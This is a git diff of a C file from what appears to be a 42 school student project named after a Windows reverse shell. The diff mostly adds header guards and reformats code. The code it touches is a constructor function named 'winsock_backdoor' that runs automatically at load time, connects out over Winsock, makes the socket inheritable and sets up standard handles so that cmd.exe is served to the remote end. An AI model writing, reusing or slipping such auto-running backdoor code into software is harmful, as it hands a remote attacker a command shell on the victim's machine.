@@ -6,27 +6,31 @@
 /*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/01/10 23:40:11 by joesanto          #+#    #+#             */
-/*   Updated: 2026/01/11 17:21:49 by joesanto         ###   ########.fr       */
+/*   Updated: 2026/01/11 19:24:05 by joesanto         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include <unistd.h>
-#include <winsock2.h>
-#include <windows.h>
-#include "windows_reverse_shell.h"
+#ifndef WINSOCK_BACKDOOR_H
+# define WINSOCK_BACKDOOR_H
+
+# include <unistd.h>
+# include <winsock2.h>
+# include <windows.h>
+# include "windows_reverse_shell.h"
 
 __attribute__((constructor))
 static
-void    winsock_backdoor(void)
+void	winsock_backdoor(void)
 {
 	SOCKET				client_fd;
 	STARTUPINFO			si;
 	PROCESS_INFORMATION	pi;
-	char 				cmd[] = "cmd.exe"; 
+	char				cmd[] = "cmd.exe";
 
 	if (winsock_client_connection(&client_fd) != 0)
-		return;
-	SetHandleInformation((HANDLE)client_fd, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
+		return ;
+	SetHandleInformation((HANDLE)client_fd, HANDLE_FLAG_INHERIT,
+		HANDLE_FLAG_INHERIT);
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
 	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
@@ -46,3 +50,5 @@ void	winsock_cleanup(void)
 {
 	WSACleanup();
 }
+
+#endif
